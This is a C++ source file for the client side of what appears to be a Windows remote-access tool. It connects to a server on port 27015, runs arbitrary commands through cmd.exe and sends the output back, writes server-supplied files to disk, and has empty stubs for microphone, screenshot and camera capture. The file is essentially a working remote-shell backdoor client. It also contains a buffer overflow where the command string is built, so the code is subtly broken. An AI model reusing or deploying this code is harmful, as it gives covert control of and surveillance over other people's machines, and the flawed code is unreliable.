#include "Header.h"

#define PORT "27015"

int main(int argc, char* argv[]) {
	WSADATA wsaData;
	SOCKET connectSocket = INVALID_SOCKET;
	addrinfo *result = NULL;
	addrinfo *ptr = NULL;

	int iResult;

	iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
	if (iResult != 0) {
		printf("Error WSAStartup %d\n", iResult);
		return 1;
	}

	while (1) {
		waitAndConnect(&connectSocket);
		char* input = NULL;

		while (1) {
			input = (char*)calloc(BUFSIZ, sizeof(char));

			if (input) {
				iResult = recv(connectSocket, input, BUFSIZ, 0);
				if (iResult > 0) {
					printf("Received command: %s\n", input);
					BOOL isOption = FALSE;
					string command = "";
					string option = "";

					for (int i = 0; i < strlen(input); i++) {
						if (isOption) {
							option.push_back(input[i]);
						}
						else {
							if (input[i] == ' ') {
								isOption = TRUE;
								continue;
							}
							command.push_back(input[i]);
						}
					}


					if (command.compare("Quit") == 0) {
						free(input);
						goto ClientShutdown;
					}

					if (command.compare("Download") == 0) {
						receiveFile(option.c_str(), connectSocket);
					}

					if (command.compare("Mic") == 0) {
					}

					if (command.compare("Screenshot") == 0) {
					}

					if (command.compare("Camera") == 0) {
					}

					if (command.compare("Remote") == 0) {
						doCommandAndSend(option.c_str(), connectSocket);
					}

				}
				else if (iResult < 0) {
					printf("Error recv. %d\n", WSAGetLastError());
					free(input);
					goto ServerDisconnected;
				}

				free(input);
			}
		}
	ServerDisconnected: {}
	}


ClientShutdown:
	// shutdown the connection since no more data will be sent
	iResult = shutdown(connectSocket, SD_SEND);
	if (iResult == SOCKET_ERROR) {
		printf("shutdown failed with error: %d\n", WSAGetLastError());
		closesocket(connectSocket);
		WSACleanup();
		return 1;
	}

	// cleanup
	closesocket(connectSocket);
	WSACleanup();
	return 0;
}

// wait for server socket and connect
void waitAndConnect(SOCKET* connectSocket) {
	int iResult = 0;
	addrinfo * result = NULL, *ptr = NULL;
	addrinfo hints;

	ZeroMemory(&hints, sizeof(hints));
	hints.ai_family = AF_UNSPEC;
	hints.ai_socktype = SOCK_STREAM;
	hints.ai_protocol = IPPROTO_TCP;

	while (1) {
		iResult = getaddrinfo(NULL, PORT, &hints, &result);
		if (iResult != 0) {
			printf("Error getaddrinfo. %d\n", iResult);
			return;
		}

		ptr = result;
		while (ptr) {
			*connectSocket = socket(ptr->ai_family, ptr->ai_socktype, ptr->ai_protocol);
			if (*connectSocket == INVALID_SOCKET) {
				printf("Error socket. %d\n", WSAGetLastError());
				return;
			}

			iResult = connect(*connectSocket, ptr->ai_addr, ptr->ai_addrlen);
			if (iResult == SOCKET_ERROR) {
				*connectSocket = INVALID_SOCKET;
				ptr = ptr->ai_next;
				continue;
			}
			break;
		}

		freeaddrinfo(result);

		if (*connectSocket == INVALID_SOCKET) {
			printf("Unable to connect to server!\n");
			continue;
		}

		printf("Connected to server with port %s\n", PORT);
		break;
	}
}

//send file to server
void sendFile(const char* fileName, SOCKET connectSocket) {
	DWORD fileSize = 0;
	HANDLE file = NULL;
	BOOL isExist = FALSE;
	int iResult = 0;

	file = CreateFile(fileName, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (file == INVALID_HANDLE_VALUE) {
		printf("[ERROR] open file. %d\n", GetLastError());
	}
	else isExist = TRUE;

	//send file exist signal
	iResult = send(connectSocket, (char*)&isExist, sizeof(isExist), 0);
	if (iResult != sizeof(isExist)) {
		printf("[ERROR] send file exist. %d\n", WSAGetLastError());
		CloseHandle(file);
		return;
	}

	if (isExist) {
		// send file size
		fileSize = GetFileSize(file, NULL);
		iResult = send(connectSocket, (char*)&fileSize, sizeof(fileSize), 0);
		if (iResult != sizeof(fileSize)) {
			printf("[ERROR] send file size. %d\n", WSAGetLastError());
			return;
		}

		DWORD dwByteRead = 0;
		char* buffer = NULL;
		// send file content
		do {
			buffer = (char*)calloc(BUFSIZ, sizeof(char));
			if (buffer) {
				if (ReadFile(file, buffer, BUFSIZ, &dwByteRead, NULL) == FALSE) {
					printf("[ERROR] read file. %d\n", GetLastError());
					free(buffer);
					return;
				}
				iResult = send(connectSocket, buffer, dwByteRead, 0);
				if (iResult != dwByteRead) {
					printf("[ERROR] send file data. %d\n", WSAGetLastError());
					free(buffer);
					return;
				}
				free(buffer);
			}
		} while (dwByteRead > 0);
		CloseHandle(file);
	}
}

// receive file from server and save
void receiveFile(const char* fileName, SOCKET connectSocket) {
	char* buffer = NULL, *filePath = NULL;
	HANDLE file = NULL;
	int iResult = 0;
	DWORD dwByteWritten = 0;
	DWORD fileSize = 0;
	BOOL isExist = FALSE;

	// get file exist signal from server
	iResult = recv(connectSocket, (char*)&isExist, sizeof(isExist), 0);
	if (iResult != sizeof(isExist)) {
		printf("[ERROR] recv. %d\n", WSAGetLastError());
		return;
	}

	if (isExist) {

		file = CreateFile(fileName, GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
		if (file == INVALID_HANDLE_VALUE) {
			printf("[ERROR] create file %d\n", GetLastError());
			return;
		}

		// receive file size
		iResult = recv(connectSocket, (char*)&fileSize, sizeof(fileSize), 0);
		if (iResult != sizeof(fileSize)) {
			printf("[ERROR] recv file size. %d\n", WSAGetLastError());
			CloseHandle(file);
			return;
		}

		// receive file data and write
		DWORD tempFileSize = 0;
		do {
			buffer = (char*)calloc(BUFSIZ, sizeof(char));
			if (buffer) {
				iResult = recv(connectSocket, buffer, BUFSIZ, 0);
				if (iResult <= 0) {
					printf("[ERROR] recv file data. %d\n", WSAGetLastError());
					CloseHandle(file);
					free(buffer);
					return;
				}

				if (WriteFile(file, buffer, iResult, &dwByteWritten, NULL) == FALSE) {
					printf("[ERROR] write file. %d\n", GetLastError());
					CloseHandle(file);
					free(buffer);
					return;
				}

				tempFileSize += iResult;
				free(buffer);
			}
		} while (tempFileSize < fileSize);

		if (file != INVALID_HANDLE_VALUE) {
			filePath = (char*)calloc(MAX_PATH + 1, sizeof(char));
			GetFinalPathNameByHandle(file, filePath, MAX_PATH, FILE_NAME_NORMALIZED);
			printf("File saved at %s\n", filePath);
			free(filePath);
		}
		CloseHandle(file);
	}
}

void doCommandAndSend(const char* command, SOCKET connectSocket) {
	HANDLE hStdInPipeRead = NULL;
	HANDLE hStdInPipeWrite = NULL;
	HANDLE hStdOutPipeRead = NULL;
	HANDLE hStdOutPipeWrite = NULL;
	BOOL ok = TRUE;

	// Create two pipes.
	SECURITY_ATTRIBUTES sa = { sizeof(SECURITY_ATTRIBUTES), NULL, TRUE };
	ok = CreatePipe(&hStdInPipeRead, &hStdInPipeWrite, &sa, 0);
	if (!ok) {
		printf("[ERROR] create pipe. %d\n", GetLastError());
		return;
	}
	ok = CreatePipe(&hStdOutPipeRead, &hStdOutPipeWrite, &sa, 0);
	if (!ok) {
		CloseHandle(hStdInPipeRead);
		CloseHandle(hStdInPipeWrite);
		printf("[ERROR] create pipe. %d\n", GetLastError());
		return;
	}

	// Create the process.
	STARTUPINFO si = {};
	si.cb = sizeof(STARTUPINFO);
	si.dwFlags = STARTF_USESTDHANDLES;
	si.hStdError = hStdOutPipeWrite;
	si.hStdOutput = hStdOutPipeWrite;
	si.hStdInput = hStdInPipeRead;
	PROCESS_INFORMATION pi = {};

	char* tempCommand = (char*)calloc(strlen(command), sizeof(char));
	tempCommand = strcat(tempCommand, "/c ");
	tempCommand = strcat(tempCommand, command);

	ok = CreateProcess("C:\\Windows\\System32\\cmd.exe", tempCommand, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);
	if (!ok) {
		CloseHandle(hStdInPipeRead);
		CloseHandle(hStdInPipeWrite);
		CloseHandle(hStdOutPipeRead);
		CloseHandle(hStdOutPipeWrite);
		printf("[ERROR] create process. %d\n", GetLastError());
		return;
	}

	CloseHandle(hStdInPipeRead);
	CloseHandle(hStdOutPipeWrite);

	// The main loop for reading output from the DIR command.
	char* buffer = NULL;
	DWORD dwByteRead = 0;

	do {
		buffer = (char*)calloc(BUFSIZ, sizeof(char));
		dwByteRead = 0;
		if (buffer) {
			ok = ReadFile(hStdOutPipeRead, buffer, BUFSIZ, &dwByteRead, NULL);
			if (ok) {
				//send output size
				int iResult = send(connectSocket, (char*)&dwByteRead, sizeof(dwByteRead), 0);
				if (iResult < 0) {
					printf("[ERROR] send command output size. %d\n", WSAGetLastError());
					free(buffer);
					goto cleanup;
				}

				//send output
				if (dwByteRead != 0) {
					int iResult = send(connectSocket, buffer, dwByteRead, 0);
					if (iResult < 0) {
						printf("[ERROR] send command output. %d\n", WSAGetLastError());
						free(buffer);
						goto cleanup;
					}
				}
			}

			free(buffer);
		}
	} while (ok == TRUE);

cleanup:
	CloseHandle(hStdInPipeWrite);
	CloseHandle(hStdOutPipeRead);
	return;
}
